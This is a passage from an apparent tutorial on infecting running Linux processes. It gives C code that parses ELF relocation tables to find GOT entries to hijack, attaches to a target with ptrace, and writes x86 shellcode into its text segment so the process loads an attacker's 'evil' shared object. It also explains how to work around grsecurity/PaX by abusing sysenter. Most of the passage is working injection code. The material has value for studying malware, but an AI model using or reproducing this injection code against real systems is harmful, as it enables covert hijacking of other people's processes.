&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symsp = syms;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symcount = <span style="color: black;">(</span>shdrp-&gt;sh_size / <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>Elf32_Sym<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>malloc<span style="color: black;">(</span><span style="color: #993333;">sizeof</span><span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info<span style="color: black;">)</span> * symcount<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!link<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>.<span style="color: #202020;">count</span> = symcount;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>; j &lt; symcount; j++, symsp++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strncpy<span style="color: black;">(</span>link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span>, &amp;symbol<span style="color: black;">[</span>symsp-&gt;st_name<span style="color: black;">]</span>, <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span><span style="color: black;">)</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">index</span> = j;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_shnum; i-- &gt; <span style="color: #cc66cc;">0</span>; shdr++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">switch</span><span style="color: black;">(</span>shdr-&gt;sh_type<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> SHT_REL:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rel = <span style="color: black;">(</span>Elf32_Rel *<span style="color: black;">)</span><span style="color: black;">(</span>mem + shdr-&gt;sh_offset<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>; j &lt; shdr-&gt;sh_size; j += <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>Elf32_Rel<span style="color: black;">)</span>, rel++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>k = <span style="color: #cc66cc;">0</span>; k &lt; symcount; k++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ELF32_R_SYM<span style="color: black;">(</span>rel-&gt;r_info<span style="color: black;">)</span> == link<span style="color: black;">[</span>k<span style="color: black;">]</span>.<span style="color: #202020;">index</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span>k<span style="color: black;">]</span>.<span style="color: #202020;">offset</span> = rel-&gt;r_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> SHT_RELA:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">default</span>:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> link;<br>
&nbsp; &nbsp; &nbsp; &nbsp; fatal:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #000000; font-weight: bold;">NULL</span>;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>To call the function we could do:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"> &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>lp = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>get_plt<span style="color: black;">(</span>mem<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"get_plt() failed<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">goto</span> done;<br>
&nbsp; <span style="color: black;">}</span><br>
&nbsp;</div>
<p>'struct lp' will provide us with the relevant PLT info to read/write the GOT entry that represents our desired symbol to hijack.</p>
<p><strong>Step 3</strong></p>
<p>At this point we are more than ready to attach to the process, this can be done using the PTRACE_ATTACH request:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Failed to attach to process<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
<span style="color: black;">}</span><br>
waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp;</div>
<p><strong>Step 4-8 (non grsec method)</strong></p>
<p>We need to force the target process to load our evil .so (shared object); in order to do so we will need to inject our loader shellcode into the process image somewhere. Some people might use the stack for this purpose, but since some systems have a non- executable stack, it would be wise to use the text segment. For this we can simply start at the base 8048000 and overwrite the first 90 bytes with our shellcode. We must make sure to save the original code so we can replace it when we are done.</p>
<p>Here is our shellcode:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">char</span> mmap_shellcode<span style="color: black;">[</span><span style="color: black;">]</span> =<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>e9<span style="color: #000099; font-weight: bold;">\x</span>3b<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>c9<span style="color: #000099; font-weight: bold;">\x</span>b0<span style="color: #000099; font-weight: bold;">\x</span>05<span style="color: #000099; font-weight: bold;">\x</span>5b<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>c9<span style="color: #000099; font-weight: bold;">\x</span>cd<span style="color: #000099; font-weight: bold;">\x</span>80<span style="color: #000099; font-weight: bold;">\x</span>83<span style="color: #000099; font-weight: bold;">\x</span>ec"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>18<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>d2<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>14<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>04<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>20<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>08<span style="color: #000099; font-weight: bold;">\x</span>07<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>0c<span style="color: #000099; font-weight: bold;">\x</span>02<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>44"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>10<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>54<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>14<span style="color: #000099; font-weight: bold;">\x</span>b8<span style="color: #000099; font-weight: bold;">\x</span>5a<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>e3<span style="color: #000099; font-weight: bold;">\x</span>cd<span style="color: #000099; font-weight: bold;">\x</span>80<span style="color: #000099; font-weight: bold;">\x</span>cc"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>e8<span style="color: #000099; font-weight: bold;">\x</span>c0<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>6c<span style="color: #000099; font-weight: bold;">\x</span>69<span style="color: #000099; font-weight: bold;">\x</span>62<span style="color: #000099; font-weight: bold;">\x</span>74<span style="color: #000099; font-weight: bold;">\x</span>65<span style="color: #000099; font-weight: bold;">\x</span>73<span style="color: #000099; font-weight: bold;">\x</span>74<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>73<span style="color: #000099; font-weight: bold;">\x</span>6f<span style="color: #000099; font-weight: bold;">\x</span>2e"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>30<span style="color: #000099; font-weight: bold;">\x</span>00"</span>;<br>
&nbsp;</div>
<p>Our hijacker will use the following function to force the target process into loading our shared object.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> mmap_library<span style="color: black;">(</span><span style="color: #993333;">int</span> pid<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> &nbsp;user_regs_struct reg;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> eip, esp, <span style="color: #993333;">string</span>, offset, str,<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax, ebx, ecx, edx;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j = <span style="color: #cc66cc;">0</span>, ret, status;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> buf<span style="color: black;">[</span><span style="color: #cc66cc;">30</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> saved_text<span style="color: black;">[</span><span style="color: #cc66cc;">94</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *p;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* save register state */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; eip = reg.<span style="color: #202020;">eip</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; esp = reg.<span style="color: #202020;">esp</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ebx = reg.<span style="color: #202020;">ebx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ecx = reg.<span style="color: #202020;">ecx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; edx = reg.<span style="color: #202020;">edx</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; offset = text_base; <span style="color: black; font-style: italic;">// probably 8048000</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%%eip -&gt; 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, eip<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Injecting mmap_shellcode at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, offset<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* were going to load our shellcode at current eip */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* first we must backup the original code into saved_text */</span><br>
&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; p = <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *<span style="color: black;">)</span>buf;<br>
&nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span>saved_text, p, <span style="color: #cc66cc;">90</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* load shellcode into text starting at base */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>mmap_shellcode + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>Setting %%eip to 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, offset<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = offset + <span style="color: #cc66cc;">2</span>; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_CONT, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* check where eip is now at */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%%eip is now at 0x%x, resetting it to 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, reg.<span style="color: #202020;">eip</span>, eip<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"inserting original code back<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>, i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>saved_text + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* reset register state */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = eip;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = eax;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = ebx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = ecx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">edx</span> = edx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">esp</span> = esp;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* detach -- when we re-attach we will have access */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* to our shared library */</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_detach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p><strong>Step 4-8 (grsec method)</strong></p>
<p>NOTE: This method works assuming that the grsec feature that disallows ptrace is not enabled.</p>
<p>As previously stated, grsec patched kernels will not allow us to write to a mapped region with ptrace if it is not writable, thus injecting shellcode that tells us to load our shared object is hopeless. We are instead going to use the method that I described in the chapter on loading the parasite, which is to not inject any code at all, but instead hijack an existing system call entrance and utilize it to execute our own syscalls prior to executing the real ones, this allows us to sneak our shared object into the process without needing to inject shellcode. We want to locate the address of sysenter dynamically (without using the /proc/&lt;pid&gt;/map file), to do this we will need to use PTRACE_SYSCALL. In alot of kernels linux-gate is not randomized, but obtaining the address to sysenter, which is within the linux-gate must be done dynamically because its loaded randomly for each process in grsec kernels. Once we know where sysenter is, we start 5 bytes above it; if you start directly on sysenter, this method doesn't seem to work on some systems. We load %eax with the SYS_open number, store our library string in the data segment etc. We then single step through the instructions for 5 steps, this will get us through the sysenter, and by the end %eax will be holding the return address, which is the fd for mmap(). We do the same thing for mmap(), but we store all of its args in the data segment right after our library string, and store the address to them in %ebx. One other significant change we are making is mapping the text segment and data segment individually, and sticking to their binary flags. i.e mapping the entire file into memory is not going to work properly because the text segment can't have write permissions and the data segment can't have execute permissions, this is an mprotect() restriction through PaX.</p>
